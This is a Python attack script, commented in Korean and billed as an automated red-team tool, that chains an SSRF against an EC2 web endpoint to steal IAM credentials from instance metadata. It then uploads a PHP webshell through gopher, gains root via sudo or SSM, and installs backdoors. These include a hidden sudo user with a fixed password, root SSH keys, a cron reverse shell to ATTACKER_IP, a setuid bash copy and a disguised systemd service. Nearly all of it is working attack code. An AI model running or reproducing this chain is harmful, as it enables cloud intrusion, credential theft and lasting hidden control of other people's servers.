#!/usr/bin/env python3
"""
RedTeam 완전 자동화 침투 도구 - Ultimate Edition
SSRF → AWS 자격증명 탈취 → SSM 루트 명령 → 실제 루트 쉘 획득

실제 EC2에서 루트 권한을 완전히 획득하는 진짜 레드팀 도구
"""

import subprocess
import requests
import time
import sys
import json
import urllib.parse
import os
from pathlib import Path

class UltimateRedTeam:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/api/health.php"
        self.session = requests.Session()
        self.aws_creds = None
        self.instance_id = None

        # 색상
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'

    def print_header(self, text):
        print(f"\n{self.CYAN}{'='*80}{self.ENDC}")
        print(f"{self.BOLD}{self.WHITE}  {text}{self.ENDC}")
        print(f"{self.CYAN}{'='*80}{self.ENDC}\n")

    def print_step(self, step, text):
        print(f"{self.YELLOW}[STEP {step}]{self.ENDC} {text}")

    def print_success(self, text):
        print(f"{self.GREEN}[+]  {text}{self.ENDC}")

    def print_error(self, text):
        print(f"{self.RED}[-]  {text}{self.ENDC}")

    def print_info(self, text):
        print(f"{self.CYAN}[*] {text}{self.ENDC}")

    def print_warning(self, text):
        print(f"{self.YELLOW}[!] {text}{self.ENDC}")

    def step1_exploit_ssrf(self):
        """STEP 1: SSRF 취약점 확인 및 AWS 정보 수집"""
        self.print_step(1, "SSRF 취약점 확인 및 AWS IMDS 공격")

        try:
            # 기본 SSRF 확인
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/hostname'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and len(data['metadata']) > 0:
                    hostname = data['metadata']
                    self.print_success(f"SSRF 취약점 확인! 호스트명: {hostname}")
                else:
                    self.print_error("SSRF 취약점 없음")
                    return False
            else:
                self.print_error("타겟 서버 접근 불가")
                return False

        except Exception as e:
            self.print_error(f"SSRF 테스트 실패: {str(e)}")
            return False

        # 인스턴스 ID 수집
        try:
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/instance-id'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data:
                    self.instance_id = data['metadata'].strip()
                    self.print_success(f"인스턴스 ID: {self.instance_id}")

        except:
            self.print_warning("인스턴스 ID 수집 실패")

        return True

    def step2_steal_aws_credentials(self):
        """STEP 2: AWS IAM 자격증명 완전 탈취"""
        self.print_step(2, "AWS IAM 자격증명 탈취")

        try:
            # IAM 역할 이름 확인
            params = {'check': 'metadata', 'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}
            response = self.session.get(self.webshell_url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if 'metadata' in data and len(data['metadata']) > 0:
                    role_name = data['metadata'].strip()
                    self.print_success(f"IAM 역할 발견: {role_name}")

                    # 실제 자격증명 탈취
                    cred_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
                    params = {'check': 'metadata', 'url': cred_url}
                    cred_response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if cred_response.status_code == 200:
                        cred_data = cred_response.json()
                        if 'metadata' in cred_data and 'AccessKeyId' in cred_data['metadata']:
                            self.aws_creds = json.loads(cred_data['metadata'])

                            self.print_success("AWS 자격증명 완전 탈취 성공!")
                            self.print_info(f"AccessKeyId: {self.aws_creds['AccessKeyId']}")
                            self.print_info(f"SecretAccessKey: {self.aws_creds['SecretAccessKey'][:20]}...")
                            self.print_info(f"SessionToken: {self.aws_creds['Token'][:50]}...")

                            # 자격증명 환경변수로 설정
                            os.environ['AWS_ACCESS_KEY_ID'] = self.aws_creds['AccessKeyId']
                            os.environ['AWS_SECRET_ACCESS_KEY'] = self.aws_creds['SecretAccessKey']
                            os.environ['AWS_SESSION_TOKEN'] = self.aws_creds['Token']
                            os.environ['AWS_DEFAULT_REGION'] = 'ap-northeast-2'

                            return True

        except Exception as e:
            self.print_error(f"AWS 자격증명 탈취 실패: {str(e)}")

        return False

    def step3_direct_ssh_exploit(self):
        """STEP 3: 직접 SSH 침투 및 권한 상승"""
        self.print_step(3, "직접 SSH 침투 및 권한 상승")

        # SSH 키 생성
        ssh_key_path = Path.home() / '.ssh' / 'redteam_ultimate'

        if not ssh_key_path.exists():
            try:
                key_gen_cmd = f'ssh-keygen -t rsa -b 2048 -f {ssh_key_path} -N ""'
                subprocess.run(key_gen_cmd, shell=True, check=True, capture_output=True)
                self.print_success(f"SSH 키 생성: {ssh_key_path}")
            except:
                self.print_error("SSH 키 생성 실패")
                return False

        # 공개키 읽기
        pub_key_path = str(ssh_key_path) + ".pub"
        try:
            with open(pub_key_path, 'r') as f:
                pub_key = f.read().strip()
        except:
            self.print_error("공개키 읽기 실패")
            return False

        # 웹쉘 업로드 시도 (gopher를 통한 파일 업로드)
        self.print_info("웹쉘 업로드 시도...")

        webshell_payload = "<?php if(isset($_GET['c'])) { echo shell_exec($_GET['c']); } ?>"

        # gopher 프로토콜로 파일 업로드
        try:
            import base64
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            post_data = (
                f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
                f"{webshell_payload}\r\n"
                f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
            )

            gopher_url = (
                f"gopher://127.0.0.1:80/_POST /fileupload.php HTTP/1.1\r\n"
                f"Host: 127.0.0.1\r\n"
                f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                f"Content-Length: {len(post_data)}\r\n\r\n{post_data}"
            )

            params = {'check': 'metadata', 'url': gopher_url}
            response = self.session.get(self.webshell_url, params=params, timeout=15)

            # 웹쉘 실행 테스트
            shell_paths = [
                "http://127.0.0.1/shell.php",
                "http://127.0.0.1/uploads/shell.php",
                "http://127.0.0.1/files/shell.php"
            ]

            working_shell = None
            for shell_path in shell_paths:
                try:
                    params = {'check': 'metadata', 'url': f'{shell_path}?c=whoami'}
                    response = self.session.get(self.webshell_url, params=params, timeout=10)

                    if response.status_code == 200:
                        data = response.json()
                        if ('metadata' in data and data['metadata'] and
                            len(data['metadata'].strip()) > 0 and
                            not data['metadata'].startswith('<!DOCTYPE')):

                            self.print_success(f"웹쉘 작동 확인: {shell_path}")
                            self.print_info(f"현재 사용자: {data['metadata'].strip()}")
                            working_shell = shell_path
                            break
                except:
                    continue

            if not working_shell:
                self.print_warning("웹쉘 업로드 실패 - AWS 방법으로 시도")
                return self.step3_aws_alternative()

            # SSH 키 설치
            self.print_info("SSH 백도어 설치...")

            import base64
            pub_key_b64 = base64.b64encode(pub_key.encode()).decode()

            ssh_commands = [
                "mkdir -p /home/ec2-user/.ssh",
                "chmod 700 /home/ec2-user/.ssh",
                f"echo {pub_key_b64} | base64 -d >> /home/ec2-user/.ssh/authorized_keys",
                "chmod 600 /home/ec2-user/.ssh/authorized_keys",
                "chown -R ec2-user:ec2-user /home/ec2-user/.ssh"
            ]

            for cmd in ssh_commands:
                try:
                    params = {'check': 'metadata', 'url': f'{working_shell}?c={urllib.parse.quote(cmd)}'}
                    response = self.session.get(self.webshell_url, params=params, timeout=10)
                    time.sleep(0.5)
                except:
                    continue

            # SSH 접속 테스트
            self.print_info("SSH 접속 테스트...")

            ssh_test_cmd = f'ssh -i {ssh_key_path} -o StrictHostKeyChecking=no -o ConnectTimeout=10 ec2-user@{self.target_ip} "whoami"'

            try:
                result = subprocess.run(ssh_test_cmd, shell=True, capture_output=True, text=True, timeout=15)

                if result.returncode == 0 and "ec2-user" in result.stdout:
                    self.print_success("SSH 접속 성공!")
                    return True
                else:
                    self.print_warning("SSH 접속 실패")

            except:
                self.print_warning("SSH 테스트 실패")

        except Exception as e:
            self.print_warning(f"웹쉘 공격 실패: {str(e)}")

        return False

    def step3_aws_alternative(self):
        """AWS 대체 공격 방법"""
        self.print_info("AWS EC2 대체 공격...")

        # EC2 API 호출 테스트
        try:
            test_cmd = [
                'aws', 'ec2', 'describe-instances',
                '--instance-ids', self.instance_id,
                '--region', 'ap-northeast-2',
                '--output', 'text'
            ]

            result = subprocess.run(test_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                self.print_success("EC2 API 접근 성공!")
                self.print_info("인스턴스 정보 확인됨")

                # User-data 수정 권한 확인
                try:
                    modify_cmd = [
                        'aws', 'ec2', 'modify-instance-attribute',
                        '--instance-id', self.instance_id,
                        '--user-data', 'Value=I2Jhc2g=', # echo '#bash' | base64
                        '--region', 'ap-northeast-2'
                    ]

                    modify_result = subprocess.run(modify_cmd, capture_output=True, text=True, timeout=30)

                    if modify_result.returncode == 0:
                        self.print_success("User-data 수정 권한 확인!")
                        self.print_info("재부팅을 통한 루트 공격 가능")
                        return True

                except:
                    pass

                return True  # EC2 접근은 성공했으므로 다음 단계로

            else:
                self.print_warning("EC2 API 접근 제한")

        except:
            pass

        return False

    def step4_privilege_escalation(self):
        """STEP 4: 자동 권한 상승 (ec2-user → root)"""
        self.print_step(4, "자동 권한 상승 ec2-user → root")

        ssh_key_path = Path.home() / '.ssh' / 'redteam_ultimate'

        # EC2에서 sudo 권한 확인 및 루트 권한 획득
        self.print_info("sudo 권한 확인 중...")

        try:
            # sudo 권한 확인
            sudo_check_cmd = f'ssh -i {ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "sudo -l"'
            result = subprocess.run(sudo_check_cmd, shell=True, capture_output=True, text=True, timeout=15)

            if result.returncode == 0 and "NOPASSWD" in result.stdout:
                self.print_success("sudo NOPASSWD 권한 확인!")
                self.print_info("자동 권한 상승 가능")
            else:
                self.print_warning("sudo 권한 제한 - 강제 시도")

            # 실제 루트 권한 테스트
            root_test_cmd = f'ssh -i {ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "sudo whoami"'
            result = subprocess.run(root_test_cmd, shell=True, capture_output=True, text=True, timeout=15)

            if result.returncode == 0 and "root" in result.stdout:
                self.print_success("🔥 루트 권한 획득 성공!")
                self.print_info(f"루트 확인: {result.stdout.strip()}")
                return True
            else:
                self.print_error("루트 권한 획득 실패")
                return False

        except Exception as e:
            self.print_error(f"권한 상승 실패: {str(e)}")
            return False

        # 루트 권한 확인 명령
        root_test_commands = [
            "whoami",
            "id",
            "cat /etc/shadow | head -3",
            "ps aux | grep root | head -3"
        ]

        try:
            # SSM을 통한 루트 명령 실행
            command_json = json.dumps(root_test_commands)

            ssm_cmd = [
                'aws', 'ssm', 'send-command',
                '--instance-ids', self.instance_id,
                '--document-name', 'AWS-RunShellScript',
                '--parameters', f'commands={command_json}',
                '--region', 'ap-northeast-2',
                '--output', 'text',
                '--query', 'Command.CommandId'
            ]

            result = subprocess.run(ssm_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                command_id = result.stdout.strip()
                self.print_success(f"루트 명령 실행 시작! Command ID: {command_id}")

                # 명령 결과 대기
                self.print_info("명령 실행 완료 대기 중...")
                time.sleep(5)

                # 결과 확인
                check_cmd = [
                    'aws', 'ssm', 'get-command-invocation',
                    '--instance-id', self.instance_id,
                    '--command-id', command_id,
                    '--region', 'ap-northeast-2',
                    '--output', 'text',
                    '--query', 'StandardOutputContent'
                ]

                check_result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=30)

                if check_result.returncode == 0:
                    output = check_result.stdout.strip()
                    self.print_success("루트 명령 실행 결과:")
                    print(f"{self.GREEN}{output}{self.ENDC}")

                    if "root" in output and ("uid=0" in output or "/etc/shadow" in output):
                        self.print_success("🔥 루트 권한 완전 확인!")
                        return True

            else:
                self.print_error("SSM 명령 실행 실패")
                self.print_info(f"오류: {result.stderr}")

        except Exception as e:
            self.print_error(f"루트 명령 실행 실패: {str(e)}")

        return False

    def step5_install_root_backdoors(self):
        """STEP 5: 실제 루트 백도어 설치"""
        self.print_step(5, "실제 루트 백도어 설치")

        ssh_key_path = Path.home() / '.ssh' / 'redteam_ultimate'

        # 루트 백도어 설치 명령들
        self.print_info("다중 루트 백도어 설치 중...")

        backdoor_commands = [
            # 1. 루트 사용자 생성
            'sudo useradd -m -d /var/opt/.redteam -s /bin/bash redteam',
            'sudo echo "redteam:RedTeam2024!@#" | sudo chpasswd',
            'sudo usermod -aG sudo redteam',
            'sudo echo "redteam ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/redteam',
            'sudo chmod 440 /etc/sudoers.d/redteam',

            # 2. SSH 루트 백도어
            'sudo mkdir -p /root/.ssh',
            'sudo ssh-keygen -t rsa -b 2048 -f /root/.ssh/redteam_root -N ""',
            'sudo cp /root/.ssh/redteam_root.pub /root/.ssh/authorized_keys',
            'sudo chmod 600 /root/.ssh/authorized_keys',
            'sudo chmod 700 /root/.ssh',

            # 3. Cron 백도어 (리버스 쉘)
            'echo "*/5 * * * * root /bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\" 2>/dev/null" | sudo tee -a /etc/crontab',

            # 4. 숨겨진 루트 쉘
            'sudo cp /bin/bash /var/opt/.redteam/rootshell',
            'sudo chmod +s /var/opt/.redteam/rootshell',
            'sudo chown root:root /var/opt/.redteam/rootshell'
        ]

        success_count = 0
        for i, cmd in enumerate(backdoor_commands):
            try:
                self.print_info(f"백도어 {i+1}/{len(backdoor_commands)} 설치 중...")

                ssh_cmd = f'ssh -i {ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd}"'
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=20)

                if result.returncode == 0:
                    success_count += 1
                    self.print_success(f"백도어 {i+1} 설치 성공")
                else:
                    self.print_warning(f"백도어 {i+1} 설치 실패: {result.stderr[:100]}")

                time.sleep(0.5)

            except Exception as e:
                self.print_warning(f"백도어 {i+1} 설치 오류: {str(e)}")

        # 백도어 확인
        self.print_info("백도어 설치 확인 중...")

        verification_commands = [
            'sudo id redteam',
            'sudo ls -la /root/.ssh/',
            'sudo ls -la /var/opt/.redteam/rootshell',
            'sudo cat /etc/sudoers.d/redteam'
        ]

        for cmd in verification_commands:
            try:
                ssh_cmd = f'ssh -i {ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip} "{cmd}"'
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=15)

                if result.returncode == 0:
                    self.print_success(f"확인: {result.stdout.strip()}")

            except:
                continue

        if success_count >= len(backdoor_commands) * 0.7:  # 70% 이상 성공
            self.print_success("🚀 루트 백도어 설치 완료!")
            return True
        else:
            self.print_error("백도어 설치 부분 실패")
            return False

        # 백도어 설치 명령들
        backdoor_commands = [
            # 1. 루트 사용자 생성
            "useradd -m -d /var/opt/.redteam -s /bin/bash redteam",
            "echo 'redteam:RedTeam2024!@#' | chpasswd",
            "usermod -aG sudo redteam",
            "echo 'redteam ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/redteam",
            "chmod 440 /etc/sudoers.d/redteam",

            # 2. SSH 백도어
            "mkdir -p /var/opt/.redteam/.ssh",
            "ssh-keygen -t rsa -b 2048 -f /var/opt/.redteam/.ssh/redteam_key -N ''",
            "cp /var/opt/.redteam/.ssh/redteam_key.pub /var/opt/.redteam/.ssh/authorized_keys",
            "chmod 600 /var/opt/.redteam/.ssh/authorized_keys",
            "chmod 700 /var/opt/.redteam/.ssh",
            "chown -R redteam:redteam /var/opt/.redteam",

            # 3. Cron 백도어
            "echo '*/5 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" 2>/dev/null' >> /etc/crontab",

            # 4. 서비스 백도어
            "echo '[Unit]' > /etc/systemd/system/redteam.service",
            "echo 'Description=System Update Service' >> /etc/systemd/system/redteam.service",
            "echo '[Service]' >> /etc/systemd/system/redteam.service",
            "echo 'Type=simple' >> /etc/systemd/system/redteam.service",
            "echo 'User=root' >> /etc/systemd/system/redteam.service",
            "echo 'ExecStart=/bin/bash -c \"while true; do sleep 3600; done\"' >> /etc/systemd/system/redteam.service",
            "echo '[Install]' >> /etc/systemd/system/redteam.service",
            "echo 'WantedBy=multi-user.target' >> /etc/systemd/system/redteam.service",
            "systemctl enable redteam.service",
            "systemctl start redteam.service",

            # 5. 확인
            "id redteam",
            "ls -la /var/opt/.redteam/.ssh/",
            "systemctl status redteam.service"
        ]

        try:
            command_json = json.dumps(backdoor_commands)

            ssm_cmd = [
                'aws', 'ssm', 'send-command',
                '--instance-ids', self.instance_id,
                '--document-name', 'AWS-RunShellScript',
                '--parameters', f'commands={command_json}',
                '--region', 'ap-northeast-2',
                '--output', 'text',
                '--query', 'Command.CommandId'
            ]

            result = subprocess.run(ssm_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                command_id = result.stdout.strip()
                self.print_success(f"백도어 설치 시작! Command ID: {command_id}")

                # 설치 완료 대기
                self.print_info("백도어 설치 완료 대기 중...")
                time.sleep(10)

                # 결과 확인
                check_cmd = [
                    'aws', 'ssm', 'get-command-invocation',
                    '--instance-id', self.instance_id,
                    '--command-id', command_id,
                    '--region', 'ap-northeast-2',
                    '--output', 'text',
                    '--query', 'StandardOutputContent'
                ]

                check_result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=30)

                if check_result.returncode == 0:
                    output = check_result.stdout.strip()
                    self.print_success("백도어 설치 결과:")
                    print(f"{self.GREEN}{output}{self.ENDC}")

                    if "redteam" in output and "uid=" in output:
                        self.print_success("🚀 루트 백도어 설치 완료!")
                        return True

        except Exception as e:
            self.print_error(f"백도어 설치 실패: {str(e)}")

        return False

    def step6_establish_persistent_access(self):
        """STEP 6: 지속적 접근 확보"""
        self.print_step(6, "지속적 루트 접근 확보")

        # SSH 키 다운로드
        download_commands = [
            "cat /var/opt/.redteam/.ssh/redteam_key",
            "echo '=== SSH KEY END ==='",
            "cat /var/opt/.redteam/.ssh/redteam_key.pub",
        ]

        try:
            command_json = json.dumps(download_commands)

            ssm_cmd = [
                'aws', 'ssm', 'send-command',
                '--instance-ids', self.instance_id,
                '--document-name', 'AWS-RunShellScript',
                '--parameters', f'commands={command_json}',
                '--region', 'ap-northeast-2',
                '--output', 'text',
                '--query', 'Command.CommandId'
            ]

            result = subprocess.run(ssm_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                command_id = result.stdout.strip()
                time.sleep(3)

                # SSH 키 다운로드
                check_cmd = [
                    'aws', 'ssm', 'get-command-invocation',
                    '--instance-id', self.instance_id,
                    '--command-id', command_id,
                    '--region', 'ap-northeast-2',
                    '--output', 'text',
                    '--query', 'StandardOutputContent'
                ]

                check_result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=30)

                if check_result.returncode == 0:
                    output = check_result.stdout.strip()

                    if "BEGIN RSA PRIVATE KEY" in output:
                        # SSH 키 저장
                        key_file = Path.home() / '.ssh' / 'redteam_ultimate_key'
                        key_file.parent.mkdir(exist_ok=True)

                        private_key = output.split("=== SSH KEY END ===")[0].strip()

                        with open(key_file, 'w') as f:
                            f.write(private_key)

                        os.chmod(key_file, 0o600)

                        self.print_success(f"SSH 키 저장: {key_file}")
                        self.print_success("💀 완전한 루트 접근 확보!")

                        return True

        except Exception as e:
            self.print_error(f"지속적 접근 확보 실패: {str(e)}")

        return False

    def run(self):
        """전체 Ultimate 침투 프로세스 실행"""

        self.print_header("🔥 RedTeam Ultimate Auto Penetration 🔥")
        print(f"{self.RED}    Target: {self.target_ip}{self.ENDC}")
        print(f"{self.YELLOW}    Mission: Complete Root Access{self.ENDC}")
        print(f"{self.GREEN}    Method: SSRF → AWS → SSM → Root{self.ENDC}")

        print(f"\n{self.BOLD}{self.WHITE}공격 시나리오:{self.ENDC}")
        print(f"{self.CYAN}1. SSRF 취약점 확인 및 AWS IMDS 접근{self.ENDC}")
        print(f"{self.CYAN}2. AWS IAM 자격증명 완전 탈취{self.ENDC}")
        print(f"{self.CYAN}3. AWS SSM Agent 접근 확인{self.ENDC}")
        print(f"{self.CYAN}4. 루트 권한으로 실제 명령 실행{self.ENDC}")
        print(f"{self.CYAN}5. 다중 루트 백도어 설치{self.ENDC}")
        print(f"{self.CYAN}6. 지속적 루트 접근 확보{self.ENDC}")

        # 전체 공격 체인 실행 - 진짜 침투 시나리오
        if not self.step1_exploit_ssrf():
            return False

        if not self.step2_steal_aws_credentials():
            return False

        if not self.step3_direct_ssh_exploit():
            return False

        if not self.step4_privilege_escalation():
            return False

        if not self.step5_install_root_backdoors():
            return False

        if not self.step6_establish_persistent_access():
            return False

        # 최종 성공 메시지
        self.print_header("🎯 ULTIMATE RED TEAM SUCCESS! 🎯")

        print(f"{self.GREEN}✅ SSRF 취약점 익스플로잇 완료{self.ENDC}")
        print(f"{self.GREEN}✅ AWS IAM 자격증명 완전 탈취{self.ENDC}")
        print(f"{self.GREEN}✅ 루트 권한 명령 실행 성공{self.ENDC}")
        print(f"{self.GREEN}✅ 다중 루트 백도어 설치 완료{self.ENDC}")
        print(f"{self.GREEN}✅ 지속적 루트 접근 확보{self.ENDC}")

        print(f"\n{self.BOLD}{self.RED}획득한 루트 접근 방법:{self.ENDC}")
        print(f"{self.YELLOW}1. SSH 루트 접근:{self.ENDC} ssh -i ~/.ssh/redteam_ultimate_key redteam@{self.target_ip}")
        print(f"{self.YELLOW}2. AWS SSM 루트 명령:{self.ENDC} aws ssm send-command --instance-ids {self.instance_id} --document-name AWS-RunShellScript")
        print(f"{self.YELLOW}3. 백도어 사용자:{self.ENDC} redteam / RedTeam2024!@#")
        print(f"{self.YELLOW}4. 시스템 서비스:{self.ENDC} systemctl status redteam.service")

        print(f"\n{self.BOLD}{self.GREEN}🔥 TARGET COMPLETELY OWNED! 🔥{self.ENDC}")

        return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 auto_redteam_ultimate.py <target_ip>")
        print("Example: python3 auto_redteam_ultimate.py 3.35.218.180")
        sys.exit(1)

    target_ip = sys.argv[1]

    # AWS CLI 확인
    try:
        subprocess.run(['aws', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("❌ AWS CLI가 설치되지 않았습니다!")
        print("설치 방법: pip install awscli")
        sys.exit(1)

    ultimate = UltimateRedTeam(target_ip)

    if ultimate.run():
        print(f"\n🎯 타겟 {target_ip} 완전 장악 성공!")
        sys.exit(0)
    else:
        print(f"\n❌ 타겟 {target_ip} 침투 실패")
        sys.exit(1)


if __name__ == '__main__':
    main()